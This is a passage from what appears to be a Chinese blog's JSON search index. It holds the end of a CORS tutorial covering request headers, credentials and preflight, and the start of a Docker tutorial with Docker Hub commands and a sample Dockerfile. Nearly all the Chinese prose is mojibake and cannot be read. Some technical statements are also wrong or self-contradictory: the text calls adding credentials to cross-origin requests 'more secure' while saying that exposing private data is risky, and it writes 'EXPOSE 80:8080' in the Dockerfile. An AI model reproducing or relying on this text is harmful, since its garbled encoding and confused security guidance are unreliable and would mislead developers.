rel=\u0026quot;preload\u0026quot;\u0026gt;.\nä¸å¹¸çš„æ˜¯ï¼Œå¯¹äºå“ªäº›éœ€è¦å’Œä¸éœ€è¦ CORS æ²¡æœ‰ç®€å•çš„è§„åˆ™ã€‚ä¾‹å¦‚ï¼š\n\u0026lt;!-- Not a CORS request --\u0026gt;\r\u0026lt;script src=\u0026#34;https://example.com/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;!-- CORS request --\u0026gt;\r\u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;https://example.com/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; #. æ£€æŸ¥æ˜¯å¦æ˜¯CORSè¯·æ±‚ å¼„æ¸…æ¥šå®ƒçš„æœ€å¥½æ–¹æ³•æ˜¯å°è¯•å¹¶æŸ¥çœ‹ç½‘ç»œ DevToolsã€‚\nåœ¨ Chrome å’Œ Firefox ä¸­ï¼Œè·¨åŸŸè¯·æ±‚ä¸ Sec-Fetch-Modeæ ‡å¤´ä¸€èµ·å‘é€ï¼Œè¯¥æ ‡å¤´ä¼šå‘Šè¯‰ä½ å®ƒæ˜¯å¦æ˜¯ CORS è¯·æ±‚ã€‚\nä¸å¹¸çš„æ˜¯ï¼ŒSafari è¿˜æ²¡æœ‰å®ç°è¿™ä¸€ç‚¹ã€‚\n#. HTML å…ƒç´ è®¾ç½® CORS è¯·æ±‚ \u0026lt;img crossorigin src=\u0026#34;â€¦\u0026#34; /\u0026gt;\r\u0026lt;script crossorigin src=\u0026#34;â€¦\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;link crossorigin rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;â€¦\u0026#34; /\u0026gt;\r\u0026lt;link crossorigin rel=\u0026#34;preload\u0026#34; as=\u0026#34;font\u0026#34; href=\u0026#34;â€¦\u0026#34; /\u0026gt; #. Origin æ ‡å¤´ é»˜è®¤æƒ…å†µä¸‹ï¼Œè·¨æº CORS è¯·æ±‚æ˜¯åœ¨æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹è¿›è¡Œçš„ã€‚\nå› æ­¤ï¼Œæ²¡æœ‰ cookieã€æ²¡æœ‰å®¢æˆ·ç«¯è¯ä¹¦ã€æ²¡æœ‰è‡ªåŠ¨Authorizationæ ‡å¤´ï¼Œå¹¶ä¸”Set-Cookieå“åº”è¢«å¿½ç•¥ã€‚\nä½†æ˜¯ï¼ŒåŒæºè¯·æ±‚åŒ…æ‹¬å‡­æ®ã€‚\nRefereræ ‡å¤´ç»å¸¸è¢«æµè§ˆå™¨æ‰©å±•å’Œâ€œäº’è”ç½‘å®‰å…¨â€è½¯ä»¶æ¬ºéª—æˆ–åˆ é™¤ï¼Œå› æ­¤åˆ›å»ºäº†ä¸€ä¸ªæ–°æ ‡å¤´Originï¼Œå®ƒæä¾›äº†å‘å‡ºè¯·æ±‚çš„é¡µé¢çš„æ¥æºã€‚\näº”ã€CORS å“åº” è¦é€šè¿‡ CORS æ£€æŸ¥å¹¶æˆäºˆå…¶ä»–æºè®¿é—®å“åº”çš„æƒé™ï¼Œå“åº”å¿…é¡»åŒ…å«ä»¥ä¸‹æ ‡å¤´ï¼š\nAccess-Control-Allow-Origin: * è¯¥*å¯ä¸è¯·æ±‚çš„å€¼æ¥ä»£æ›¿Originå¤´ï¼Œä½†*å¯¹äºä»»ä½•è¯·æ±‚æ²¡æœ‰å‡­æ®å‘é€ã€‚\nä¸æ‰€æœ‰æ ‡å¤´ä¸€æ ·ï¼Œæ ‡å¤´åç§°ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†å€¼åŒºåˆ†å¤§å°å†™ã€‚\n#. CORS ç¼“å­˜ CORS è¯·æ±‚ä¸ä¼šç»•è¿‡ç¼“å­˜ã€‚Firefox ä¼šæ ¹æ®è¯·æ±‚æ˜¯å¦å…·æœ‰å‡­æ®å¯¹å…¶ HTTP ç¼“å­˜è¿›è¡Œåˆ†åŒºï¼Œ\nChrome ä¹Ÿè®¡åˆ’è¿™æ ·åšï¼Œä½†ä»ç„¶éœ€è¦æ‹…å¿ƒ CDN ç¼“å­˜ã€‚\n#. å°† CORS æ·»åŠ åˆ°é•¿ç¼“å­˜èµ„æº å¦‚æœä½ çš„èµ„äº§å…·æœ‰è¾ƒé•¿çš„ç¼“å­˜ç”Ÿå‘½å‘¨æœŸï¼Œä½ å¯èƒ½ä¹ æƒ¯äºåœ¨å†…å®¹æ›´æ”¹æ—¶æ›´æ”¹æ–‡ä»¶åï¼Œä»¥ä¾¿ç”¨æˆ·é€‰æ‹©æ–°å†…å®¹ã€‚\nå½“æ¶‰åŠåˆ°æ ‡é¢˜æ›´æ”¹æ—¶ï¼ŒåŒæ ·ä¹Ÿé€‚ç”¨ã€‚\nå¦‚æœä½ æ·»åŠ Access-Control-Allow-Origin: *åˆ°å…·æœ‰è¾ƒé•¿ç¼“å­˜ç”Ÿå‘½å‘¨æœŸçš„èµ„æºï¼Œè¯·åŠ¡å¿…æ›´æ”¹ URLï¼Œ\nä»¥ä¾¿å®¢æˆ·ç«¯è¿”å›æ‚¨çš„æœåŠ¡å™¨å¹¶è·å–æ–°æ ‡å¤´ï¼Œè€Œä¸æ˜¯é‡ç”¨æ²¡æœ‰æ ‡å¤´çš„ç¼“å­˜ç‰ˆæœ¬ã€‚\n#. ç»™ CORS è¡¨å¤´æ·»åŠ æ¡ä»¶ ä½ åº”è¯¥åœ¨å¯¹ URL çš„æ‰€æœ‰å“åº”ä¸­åŒ…å«å®ƒï¼Œæ— è®ºè¯·æ±‚æ˜¯å¦æœ‰Cookieæ ‡å¤´ã€‚\nåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆï¼Œè¿™å°±æ˜¯è§„èŒƒã€‚\nVary: Origin, Cookie #. Access-Control-Allow-Origin: * å¹¶ä¸å®Œå…¨å®‰å…¨ å¦‚æœèµ„æºä¸åŒ…å«ç§æœ‰æ•°æ®ï¼Œé‚£ä¹ˆAccess-Control-Allow-Origin: * æ˜¯å®Œå…¨å®‰å…¨çš„ã€‚\nå¦‚æœèµ„æºæœ‰æ—¶åŒ…å«ä¾èµ–äº cookie çš„ç§æœ‰æ•°æ®ï¼Œé‚£ä¹ˆæ·»åŠ Access-Control-Allow-Origin: *ä¹Ÿæ˜¯æ˜¯å®‰å…¨çš„ï¼Œåªè¦ä½ è¿˜åŒ…å«ä¸€ä¸ªVary: Cookieæ ‡å¤´ã€‚\nä½†æ˜¯ï¼Œå¦‚æœä½ ä½¿ç”¨è¯¸å¦‚å‘ä»¶äººçš„ IP åœ°å€ä¹‹ç±»çš„ä¸œè¥¿æ¥â€œä¿æŠ¤â€æ•°æ®ï¼Œé‚£ä¹ˆAccess-Control-Allow-Origin: *å°±æ˜¯ä¸å®‰å…¨çš„ã€‚\n#. æ·»åŠ å‡­æ® é»˜è®¤æƒ…å†µä¸‹ï¼Œè·¨æº CORS è¯·æ±‚æ˜¯åœ¨æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹è¿›è¡Œçš„ã€‚ä½†æ˜¯ï¼Œå„ç§ API å°†å…è®¸ä½ é‡æ–°æ·»åŠ å‡­æ®ã€‚\næ·»åŠ å‡­æ®æ›´åŠ å®‰å…¨ï¼Œå› ä¸ºå…¬å¼€ç§äººæ•°æ®æ˜¯æœ‰é£é™©çš„ã€‚\n request  const response = await fetch(url, {\rcredentials: \u0026#39;include\u0026#39;,\r});\r//or\r\u0026lt;img crossorigin=\u0026#34;use-credentials\u0026#34; src=\u0026#34;â€¦\u0026#34; /\u0026gt;  response  Access-Control-Allow-Credentials: true\rAccess-Control-Allow-Origin: https://danacoding.com\rVary: Cookie, Origin å…­ã€ä¸å¯»å¸¸çš„è¯·æ±‚å’Œé¢„æ£€ é€šå¸¸çš„è¯·æ±‚æ˜¯è¿™æ ·çš„\nfetch(url, { credentials: \u0026#39;include\u0026#39; });\rfetch(url, {\rmethod: \u0026#39;POST\u0026#39;,\rbody: formData,\r}); ä¸å¯»å¸¸çš„è¯·æ±‚æ˜¯è¿™æ ·çš„\nfetch(url, {\rmethod: \u0026#39;wibbley-wobbley\u0026#39;,\rcredentials: \u0026#39;include\u0026#39;,\rheaders: {\rfancy: \u0026#39;headers\u0026#39;,\r\u0026#39;here-we\u0026#39;: \u0026#39;go\u0026#39;,\r},\r}); #. é¢„æ£€è¯·æ±‚ å¦‚æœä½ å°è¯•å‘å‡ºä¸å¯»å¸¸çš„è¯·æ±‚ï¼Œæµè§ˆå™¨é¦–å…ˆä¼šè¯¢é—®å…¶ä»–æºæ˜¯å¦å¯ä»¥å‘é€å®ƒã€‚æ­¤è¿‡ç¨‹ç§°ä¸ºé¢„æ£€ã€‚\nåœ¨å‘å‡ºè¯·æ±‚ä¹‹å‰ï¼Œæµè§ˆå™¨ä¼šä½¿ç”¨OPTIONSæ–¹æ³•å‘ç›®æ ‡ URL å‘å‡ºé¢„æ£€è¯·æ±‚ï¼Œå¹¶ä¸”æ ‡å¤´å¦‚ä¸‹ï¼š\nAccess-Control-Request-Method: wibbley-wobbley\rAccess-Control-Request-Headers: fancy, here-we é¢„æ£€è¯·æ±‚ä»ä¸åŒ…å«å‡­æ®ï¼ˆä¸»è¯·æ±‚ä¼šåŒ…å«ï¼‰ã€‚\n#. é¢„æ£€å“åº” Access-Control-Max-Age: 600\rAccess-Control-Allow-Methods: Wibbley-Wobbley, WIBBLEY-WOBBLEY //Chrome åŒºåˆ†å¤§å°å†™\rAccess-Control-Allow-Headers: fancy, here-we   Access-Control-Max-Age ç¼“å­˜æ­¤é¢„æ£€å“åº”çš„ç§’æ•°ï¼Œä»¥é¿å…éœ€è¦å¯¹æ­¤ URL è¿›è¡Œè¿›ä¸€æ­¥é¢„æ£€ã€‚é»˜è®¤å€¼ä¸º 5 ç§’ã€‚\n  Access-Control-Allow-Methods å…è®¸çš„ä¸å¯»å¸¸æ–¹æ³•ã€‚è¿™å¯ä»¥æ˜¯é€—å·åˆ†éš”çš„åˆ—è¡¨ï¼Œå¹¶ä¸”å€¼åŒºåˆ†å¤§å°å†™ã€‚\nå¦‚æœè¦åœ¨æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹å‘é€ä¸»è¯·æ±‚ï¼Œä½¿ç”¨*ã€‚\n  Access-Control-Allow-Headers å…è®¸çš„ä¸å¯»å¸¸æ ‡é¢˜ã€‚è¿™å¯ä»¥æ˜¯é€—å·åˆ†éš”çš„åˆ—è¡¨ï¼Œä¸åŒºåˆ†å¤§å°å†™ã€‚\nå¦‚æœè¦åœ¨æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹å‘é€ä¸»è¯·æ±‚ï¼Œä½¿ç”¨*ã€‚\n  ","description":"","id":12,"section":"others","tags":null,"title":"CORS è·¨åŸŸèµ„æºå…±äº«","uri":"https://codthing.github.io/others/cors/cors/"},{"content":"1. Docker Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº Go è¯­è¨€ å¹¶éµä» Apache2.0 åè®®å¼€æºã€‚\nDocker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚\nå®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ï¼ˆç±»ä¼¼ iPhone çš„ appï¼‰,æ›´é‡è¦çš„æ˜¯å®¹å™¨æ€§èƒ½å¼€é”€æä½ã€‚\n2. Docker æ¶æ„ Docker å¹³å°ç”±å‡ ä¸ªç»„ä»¶ç»„æˆï¼Œç”¨æ¥æ„å»ºã€è¿è¡Œå’Œç®¡ç†å®¹å™¨åŒ–åº”ç”¨ç¨‹åºã€‚\nğŸ“¦Docker\râ”œâ”€ ğŸ“‚Repository ä»“åº“\râ”‚ â”œâ”€ ğŸ“‚Image é•œåƒ\râ”‚ â”‚ â”œâ”€ ğŸ“‚Container å®¹å™¨\râ”‚ â”‚ â””â”€ ğŸ“‚Container...\râ”‚ â””â”€ ğŸ“‚Image...\râ””â”€ ğŸ“‚Repository... ğŸ“¦Image é•œåƒ\râ””â”€ ğŸ“‚åŸºç¡€é•œåƒ\râ”‚ â””â”€ ğŸ“‚å­é•œåƒ\râ”‚ â”‚ â”œâ”€ ğŸ“‚å®˜æ–¹é•œåƒ\râ”‚ â”‚ â””â”€ ğŸ“‚ç”¨æˆ·é•œåƒ 2-1. Docker å¼•æ“    æ¦‚å¿µ è¯´æ˜     Docker Client Docker å®¢æˆ·ç«¯æ˜¯ä¸€ä¸ªåä¸º docker çš„å‘½ä»¤è¡Œåº”ç”¨ç¨‹åºï¼Œå®ƒæä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢ï¼ˆCLIï¼‰æ¥ä¸ Docker æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚ docker å‘½ä»¤ä½¿ç”¨ Docker REST API å‘æœ¬åœ°æˆ–è¿œç¨‹æœåŠ¡å™¨å‘é€æŒ‡ä»¤ï¼Œå¹¶ä½œä¸ºç®¡ç†å®¹å™¨çš„ä¸»è¦æ¥å£ã€‚   Docker Server Docker æœåŠ¡å™¨æ˜¯ä¸€ä¸ªåä¸º dockerd çš„å®ˆæŠ¤è¿›ç¨‹ã€‚ dockerd å®ˆæŠ¤è¿›ç¨‹é€šè¿‡ Docker REST API å“åº”æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶ä¸”å¯ä»¥ä¸å…¶ä»–å®ˆæŠ¤è¿›ç¨‹äº¤äº’ã€‚ Docker æœåŠ¡å™¨è¿˜è´Ÿè´£è·Ÿè¸ªå®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸã€‚   Docker Objects åˆ›å»ºå’Œé…ç½®å¤šä¸ªå¯¹è±¡ä»¥æ”¯æŒå®¹å™¨éƒ¨ç½²ã€‚ åŒ…æ‹¬ç½‘ç»œã€å­˜å‚¨å·ã€æ’ä»¶å’Œå…¶ä»–æœåŠ¡å¯¹è±¡ã€‚ è¿™äº›å¯¹è±¡å¯ä»¥æ ¹æ®éœ€è¦åˆ›å»ºå’Œéƒ¨ç½²çš„é¡¹ç›®ã€‚       å‘½ä»¤ è¯´æ˜     docker æŸ¥çœ‹ Docker å®¢æˆ·ç«¯çš„æ‰€æœ‰å‘½ä»¤é€‰é¡¹   docker stats --help æŸ¥çœ‹ docker stats æŒ‡ä»¤çš„å…·ä½“ä½¿ç”¨æ–¹æ³•    2-2. Docker Hub Docker Hub æ˜¯ä¸€ä¸ªè½¯ä»¶å³æœåŠ¡ (SaaS) Docker å®¹å™¨æ³¨å†Œè¡¨ã€‚\nDocker æ³¨å†Œè¡¨æ˜¯ç”¨æ¥å­˜å‚¨å’Œåˆ†å‘å®¹å™¨é•œåƒçš„å­˜å‚¨åº“ã€‚\nDocker Hub æ˜¯ Docker ç”¨äºé•œåƒç®¡ç†çš„é»˜è®¤å…¬å…±æ³¨å†Œè¡¨ã€‚\nè¯·è®°ä½ï¼Œå¯ä»¥åˆ›å»ºå’Œä½¿ç”¨ç§æœ‰ Docker æ³¨å†Œè¡¨æˆ–ä½¿ç”¨è®¸å¤šå¯ç”¨çš„äº‘æä¾›å•†ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ Azure å®¹å™¨æ³¨å†Œè¡¨æ¥å­˜å‚¨å®¹å™¨æ˜ åƒä»¥åœ¨å¤šä¸ª Azure å®¹å™¨å¯ç”¨æœåŠ¡ä¸­ä½¿ç”¨ã€‚\nå½“ç„¶ä¸æ­¢ Docker Hubï¼Œè¿œç¨‹çš„æœåŠ¡å•†ä¸ä¸€æ ·ï¼Œä½†æ˜¯æ“ä½œéƒ½æ˜¯ä¸€æ ·çš„ã€‚\n   é¡¹ç›® å‘½ä»¤ å¤‡æ³¨     æ³¨å†Œ  åœ¨https://hub.docker.com å…è´¹æ³¨å†Œä¸€ä¸ª Docker è´¦å·ã€‚   ç™»å½• docker login    é€€å‡º docker logout    æŸ¥æ‰¾é•œåƒ docker search username å…³é”®è¯ username æ˜¯æœç´¢è‡ªå·±åº“çš„é•œåƒï¼Œæˆ–è€… docker search ubuntu æœç´¢å…¬å…±åº“å…³äº ubuntu çš„é•œåƒã€‚   æ‹‰å–é•œåƒ docker pull ubuntu    æ¨é€é•œåƒ docker push username/ubuntu:18.0.4 åœ¨æ¨é€å‰ï¼Œéœ€è¦æ ‡å¿—è¦æ¨é€çš„é•œåƒ docker tag ubuntu:18.0.4 username/ubuntu:18.0.4 ,ç„¶ååˆ—å‡ºçœ‹çœ‹æ˜¯å¦å­˜åœ¨ docker imagesã€‚è®°å¾— username æ”¹ä¸ºè‡ªå·±çš„Hubç”¨æˆ·åã€‚    3. Docker é•œåƒçš„å·¥ä½œåŸç† äº†è§£ Docker ä¸­ä½¿ç”¨çš„è½¯ä»¶ã€åŒ…å’Œé•œåƒä¹‹é—´çš„å·®å¼‚æœ‰åŠ©äºæ›´å¥½åœ°ç†è§£ Docker é•œåƒçš„å·¥ä½œåŸç†ã€‚\n3-1. å®¹å™¨è½¯ä»¶ æ‰“åŒ…åˆ°å®¹å™¨ä¸­çš„è½¯ä»¶ä¸ä»…é™äºå¼€å‘äººå‘˜æ„å»ºçš„åº”ç”¨ç¨‹åºã€‚å½“è°ˆè®ºè½¯ä»¶æ—¶ï¼ŒæŒ‡çš„æ˜¯åº”ç”¨ç¨‹åºä»£ç ã€ç³»ç»ŸåŒ…ã€äºŒè¿›åˆ¶æ–‡ä»¶ã€åº“ã€é…ç½®æ–‡ä»¶ä»¥åŠåœ¨å®¹å™¨ä¸­è¿è¡Œçš„æ“ä½œç³»ç»Ÿã€‚\n3-2. å®¹å™¨é•œåƒ å®¹å™¨é•œåƒæ˜¯ä¸å¯å˜çš„ã€‚ä¸€æ—¦æ„å»ºäº†é•œåƒï¼Œå°±æ— æ³•æ›´æ”¹é•œåƒã€‚\næ›´æ”¹é•œåƒçš„ å”¯ä¸€æ–¹æ³• æ˜¯åˆ›å»ºæ–°é•œåƒã€‚æ­¤åŠŸèƒ½ä¿è¯åœ¨ç”Ÿäº§ä¸­ä½¿ç”¨çš„é•œåƒä¸å¼€å‘å’Œ QA ä¸­ä½¿ç”¨çš„é•œåƒç›¸åŒã€‚\n3-3. ä¸»æœºæ“ä½œç³»ç»Ÿ ä¸»æœºæ“ä½œç³»ç»Ÿæ˜¯è¿è¡Œ Docker å¼•æ“çš„æ“ä½œç³»ç»Ÿã€‚åœ¨ Linux ä¸Šè¿è¡Œçš„ Docker å®¹å™¨ å…±äº«ä¸»æœºæ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œä¸éœ€è¦å®¹å™¨æ“ä½œç³»ç»Ÿï¼Œåªè¦äºŒè¿›åˆ¶æ–‡ä»¶å¯ä»¥ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿå†…æ ¸å³å¯ã€‚\nä½†æ˜¯ï¼ŒWindows å®¹å™¨éœ€è¦å®¹å™¨æ“ä½œç³»ç»Ÿã€‚å®¹å™¨ä¾èµ–æ“ä½œç³»ç»Ÿå†…æ ¸æ¥ç®¡ç†æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œç®¡ç†ã€è¿›ç¨‹è°ƒåº¦å’Œå†…å­˜ç®¡ç†ç­‰æœåŠ¡ã€‚\n3-4. å®¹å™¨æ“ä½œç³»ç»Ÿ å®¹å™¨æ“ä½œç³»ç»Ÿæ˜¯ä½œä¸ºæ‰“åŒ…é•œåƒä¸€éƒ¨åˆ†çš„æ“ä½œç³»ç»Ÿã€‚å¯ä»¥çµæ´»åœ° åœ¨å®¹å™¨ä¸­åŒ…å«ä¸åŒç‰ˆæœ¬çš„ Linux æˆ– Windows æ“ä½œç³»ç»Ÿã€‚è¿™ç§çµæ´»æ€§èƒ½å¤Ÿè®¿é—®ç‰¹å®šçš„æ“ä½œç³»ç»ŸåŠŸèƒ½æˆ–å®‰è£…åº”ç”¨ç¨‹åºå¯èƒ½ä½¿ç”¨çš„å…¶ä»–è½¯ä»¶ã€‚\nå®¹å™¨æ“ä½œç³»ç»Ÿä¸ä¸»æœºæ“ä½œç³»ç»Ÿéš”ç¦»ï¼Œæ˜¯éƒ¨ç½²å’Œè¿è¡Œåº”ç”¨ç¨‹åºçš„ç¯å¢ƒã€‚ç»“åˆé•œåƒçš„ä¸å˜æ€§ï¼Œè¿™ç§éš”ç¦»æ„å‘³ç€åœ¨å¼€å‘ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºçš„ç¯å¢ƒä¸ç”Ÿäº§ä¸­çš„ç¯å¢ƒç›¸åŒã€‚\nåœ¨ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨ Ubuntu Linux ä½œä¸ºå®¹å™¨æ“ä½œç³»ç»Ÿï¼Œå¹¶ä¸”è¯¥æ“ä½œç³»ç»Ÿä¸ä¼šå› å¼€å‘æˆ–ç”Ÿäº§è€Œæ”¹å˜ã€‚ä½¿ç”¨çš„é•œåƒæ€»æ˜¯ç›¸åŒçš„ã€‚\n3-5. å¯å †å æ–‡ä»¶ç³»ç»Ÿ å‡è®¾ä¸º Web åº”ç”¨ç¨‹åºæ„å»ºé•œåƒã€‚æŠŠ Ubuntu å‘è¡Œç‰ˆä½œä¸ºä¸€ä¸ªåŸºç¡€é•œåƒæ”¾åœ¨å¼•å¯¼æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šã€‚æ¥ä¸‹æ¥å®‰è£… Nginx å’Œ Web åº”ç”¨ç¨‹åºã€‚æœ‰æ•ˆåœ°å°† Nginx å’Œ Web åº”ç”¨ç¨‹åºåˆ†å±‚æ”¾ç½®åœ¨åŸå§‹ Ubuntu é•œåƒä¹‹ä¸Šã€‚\nä¸€æ—¦å®¹å™¨ä»é•œåƒè¿è¡Œï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªæœ€ç»ˆçš„å¯å†™å±‚ã€‚ç„¶è€Œï¼Œå½“å®¹å™¨è¢«é”€æ¯æ—¶ï¼Œè¿™ä¸€å±‚ä¸ä¼šç»§ç»­å­˜åœ¨ã€‚\n3-6. åŸºç¡€é•œåƒ åŸºç¡€é•œåƒæ˜¯ä½¿ç”¨ Docker ä¸´æ—¶é•œåƒçš„é•œåƒã€‚ ä¸´æ—¶é•œåƒæ˜¯ä¸€ä¸ªç©ºå®¹å™¨é•œåƒï¼Œä¸ä¼šåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿå±‚ã€‚ æ­¤é•œåƒå‡å®šè¦è¿è¡Œçš„åº”ç”¨ç¨‹åºå¯ä»¥ç›´æ¥ä½¿ç”¨ä¸»æœºæ“ä½œç³»ç»Ÿå†…æ ¸ã€‚\nå¦ä¸€ç§è¯´æ³•æ˜¯ï¼šæ²¡æœ‰çˆ¶é•œåƒçš„é•œåƒï¼Œé€šå¸¸æ˜¯å¸¦æœ‰åƒ ubuntuã€busybox æˆ– debian è¿™æ ·çš„æ“ä½œç³»ç»Ÿçš„é•œåƒã€‚\n3-7. çˆ¶é•œåƒ çˆ¶é•œåƒæ˜¯ä¸€ä¸ªâ€œå®¹å™¨å›¾åƒâ€ï¼Œå¯ä»¥ä»ä¸­åˆ›å»ºé•œåƒã€‚\nä¾‹å¦‚ï¼Œä¸å…¶ä»å¤´å¼€å§‹åˆ›å»ºé•œåƒç„¶åå®‰è£… Ubuntuï¼Œå®æ„¿ä½¿ç”¨å·²ç»åŸºäº Ubuntu çš„é•œåƒã€‚ ç”šè‡³å¯ä»¥ä½¿ç”¨å·²ç»å®‰è£…äº† Nginx çš„é•œåƒã€‚ çˆ¶é•œåƒé€šå¸¸åŒ…å«å®¹å™¨æ“ä½œç³»ç»Ÿã€‚\nå¦ä¸€ç§è¯´æ³•æ˜¯ï¼šå»ºç«‹åœ¨åŸºç¡€é•œåƒä¸Šå¹¶æ·»åŠ é™„åŠ åŠŸèƒ½çš„é•œåƒã€‚\n3-8. åŸºç¡€é•œåƒå’Œçˆ¶é•œåƒçš„åŒºåˆ« è¿™ä¸¤ç§é•œç±»å‹éƒ½å…è®¸åˆ›å»ºå¯é‡ç”¨çš„é•œåƒã€‚ ä½†æ˜¯ï¼ŒåŸºç¡€é•œåƒå…è®¸æ›´å¥½åœ°æ§åˆ¶æœ€ç»ˆé•œåƒçš„å†…å®¹ã€‚ å›æƒ³ä¸€ä¸‹ä¹‹å‰çš„é•œåƒæ˜¯ä¸å¯å˜çš„ï¼Œå†…å®¹åªèƒ½æ·»åŠ è€Œä¸èƒ½åˆ å‡ã€‚\n3-9. Dockerfile Dockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ„å»ºå’Œè¿è¡Œ Docker é•œåƒçš„æŒ‡ä»¤ã€‚å®šä¹‰äº†é•œåƒçš„ä»¥ä¸‹æ–¹é¢ï¼š\n ç”¨äºåˆ›å»ºæ–°é•œåƒçš„åŸºç¡€é•œåƒæˆ–çˆ¶é•œåƒ æ›´æ–°æ“ä½œç³»ç»Ÿå’Œå®‰è£…é™„åŠ è½¯ä»¶çš„å‘½ä»¤ æ„å»ºè¦åŒ…å«çš„å·¥ä»¶ï¼Œä¾‹å¦‚å·²å¼€å‘çš„åº”ç”¨ç¨‹åº è¦å…¬å¼€çš„æœåŠ¡ï¼Œä¾‹å¦‚å­˜å‚¨å’Œç½‘ç»œé…ç½® å¯åŠ¨å®¹å™¨æ—¶è¿è¡Œçš„å‘½ä»¤  å‡è®¾ä¸º ASP.NET Core ç½‘ç«™åˆ›å»ºä¸€ä¸ª Docker é•œåƒã€‚ Dockerfile å¯èƒ½ç±»ä¼¼äºä»¥ä¸‹ç¤ºä¾‹\n# Step 1: ä¸ºæ–°é•œåƒæŒ‡å®šçˆ¶é•œåƒ\rFROM ubuntu:18.04\r# Step 2: æ›´æ–°æ“ä½œç³»ç»Ÿè½¯ä»¶åŒ…å¹¶å®‰è£…å…¶ä»–è½¯ä»¶\rRUN apt -y update \u0026amp;\u0026amp; apt install -y wget nginx software-properties-common apt-transport-https \\\r\u0026amp;\u0026amp; wget -q https://packages.microsoft.com/config/ubuntu/18.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb \\\r\u0026amp;\u0026amp; dpkg -i packages-microsoft-prod.deb \\\r\u0026amp;\u0026amp; add-apt-repository universe \\\r\u0026amp;\u0026amp; apt -y update \\\r\u0026amp;\u0026amp; apt install -y dotnet-sdk-3.0\r# Step 3: é…ç½®Nginxç¯å¢ƒ\rCMD service nginx start\r# Step 4: é…ç½®Nginxç¯å¢ƒ\rCOPY ./default /etc/nginx/sites-available/default\r# STEP 5: é…ç½®å·¥ä½œç›®å½•\rWORKDIR /app\r# STEP 6: å¤åˆ¶ç½‘ç«™ä»£ç åˆ°å®¹å™¨\rCOPY ./website/. .\r# STEP 7: é…ç½®ç½‘ç»œè¦æ±‚\rEXPOSE 80:8080\r# STEP 8: å®šä¹‰å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹çš„å…¥å£ç‚¹\rENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;website.dll\u0026#34;] ä¹‹å‰æåˆ°è¿‡ Docker é•œåƒä½¿ç”¨äº†å¯å †å æ–‡ä»¶ç³»ç»Ÿ ã€‚å½“æ„å»ºæœ€ç»ˆçš„å®¹å™¨é•œåƒæ—¶ï¼Œæ¯ä¸ªæ­¥éª¤éƒ½ä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„å®¹å™¨é•œåƒã€‚è¿™äº›ä¸´æ—¶é•œåƒå åŠ åœ¨ä¹‹å‰çš„é•œåƒä¹‹ä¸Šï¼Œå¹¶åœ¨æ‰€æœ‰æ­¥éª¤å®Œæˆåå‘ˆç°ä¸ºå•ä¸ªå›¾åƒã€‚\næœ€åï¼Œè¯·æ³¨æ„æœ€åä¸€æ­¥ï¼Œç¬¬ 8 æ­¥ã€‚æ–‡ä»¶ä¸­çš„â€œENTRYPOINTâ€è¡¨ç¤ºä¸€æ—¦ä»é•œåƒè¿è¡Œå®¹å™¨ï¼Œå°†æ‰§è¡Œå“ªä¸ªè¿›ç¨‹ã€‚\n3-10. ç®¡ç†é•œåƒ Docker é•œåƒæœ€åˆæ˜¯å­˜å‚¨åœ¨ PC ä¸Šçš„å¤§æ–‡ä»¶ï¼Œéœ€è¦å·¥å…·æ¥ç®¡ç†è¿™äº›æ–‡ä»¶ã€‚\nDocker CLI å…è®¸é€šè¿‡æ„å»ºã€åˆ—å‡ºã€åˆ é™¤å’Œè¿è¡Œé•œåƒæ¥ç®¡ç†é•œåƒã€‚ä½¿ç”¨ docker å®¢æˆ·ç«¯æ¥ç®¡ç† Docker é•œåƒã€‚å®¢æˆ·ç«¯ä¸ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œæ˜¯å°†æ‰€æœ‰æŸ¥è¯¢å‘é€åˆ° dockerd å®ˆæŠ¤è¿›ç¨‹ã€‚\næ„å»ºé•œåƒ\nä½¿ç”¨ docker build å‘½ä»¤æ¥æ„å»º Docker é•œåƒã€‚å‡è®¾ä½¿ç”¨ä¹‹å‰çš„ Dockerfile 